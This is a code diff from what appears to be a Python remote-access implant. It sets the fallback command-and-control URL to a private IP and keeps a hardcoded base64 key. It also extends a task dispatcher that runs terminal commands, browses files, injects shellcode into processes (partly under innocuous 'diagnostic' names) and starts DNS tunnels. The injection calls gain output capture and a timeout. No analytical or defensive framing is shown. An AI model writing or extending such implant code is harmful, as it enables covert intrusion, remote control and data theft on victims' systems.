@@ -67,7 +67,7 @@ try:
     ENCRYPTION_KEY = KEY_B64.encode()
 except ImportError:
     # Fallback configuration if config.py is not available
-    C2_URL = "http://10.2.0.2:5000"
+    C2_URL = "http://192.168.10.57:5000"
     BEACON_INTERVAL = 10
     NETWORK_TIMEOUT = 10
     _KEY_B64 = ''.join(['dGhpcyBpcyBhIHNlY3JldCBrZXkgZm9yIGVuY3J5cHRpb24='])
@@ -388,10 +388,10 @@ def run_task(task):
             'terminal_execute': lambda: execute_command(task_data.get('command')) if task_data.get('command') else "No command provided",
             'files.browser': lambda: list_directory(task_data.get('path', '.')),
             'files_browser': lambda: list_directory(task_data.get('path', '.')),
-            'diagnostic.inject': lambda: inject_shellcode(task_data.get('process'), task_data.get('shellcode')) if task_data.get('process') and task_data.get('shellcode') else "Missing process or shellcode",
-            'diagnostic_inject': lambda: inject_shellcode(task_data.get('process'), task_data.get('shellcode')) if task_data.get('process') and task_data.get('shellcode') else "Missing process or shellcode",
-            'shellcode.inject': lambda: inject_shellcode(task_data.get('process'), task_data.get('shellcode')) if task_data.get('process') and task_data.get('shellcode') else "Missing process or shellcode",
-            'shellcode_inject': lambda: inject_shellcode(task_data.get('process'), task_data.get('shellcode')) if task_data.get('process') and task_data.get('shellcode') else "Missing process or shellcode",
+            'diagnostic.inject': lambda: inject_shellcode(task_data.get('process'), task_data.get('shellcode'), task_data.get('capture_output', True), task_data.get('wait_timeout', 10)) if task_data.get('process') and task_data.get('shellcode') else "Missing process or shellcode",
+            'diagnostic_inject': lambda: inject_shellcode(task_data.get('process'), task_data.get('shellcode'), task_data.get('capture_output', True), task_data.get('wait_timeout', 10)) if task_data.get('process') and task_data.get('shellcode') else "Missing process or shellcode",
+            'shellcode.inject': lambda: inject_shellcode(task_data.get('process'), task_data.get('shellcode'), task_data.get('capture_output', True), task_data.get('wait_timeout', 10)) if task_data.get('process') and task_data.get('shellcode') else "Missing process or shellcode",
+            'shellcode_inject': lambda: inject_shellcode(task_data.get('process'), task_data.get('shellcode'), task_data.get('capture_output', True), task_data.get('wait_timeout', 10)) if task_data.get('process') and task_data.get('shellcode') else "Missing process or shellcode",
             'network.tunnel': lambda: start_dns_tunnel(task_data.get('domain')) if task_data.get('domain') else "Missing domain",
             'network_tunnel': lambda: start_dns_tunnel(task_data.get('domain')) if task_data.get('domain') else "Missing domain",
             'dns_tunnel_start': lambda: start_dns_tunnel_cmd(task_data.get('domain')) if task_data.get('domain') else "Missing domain",
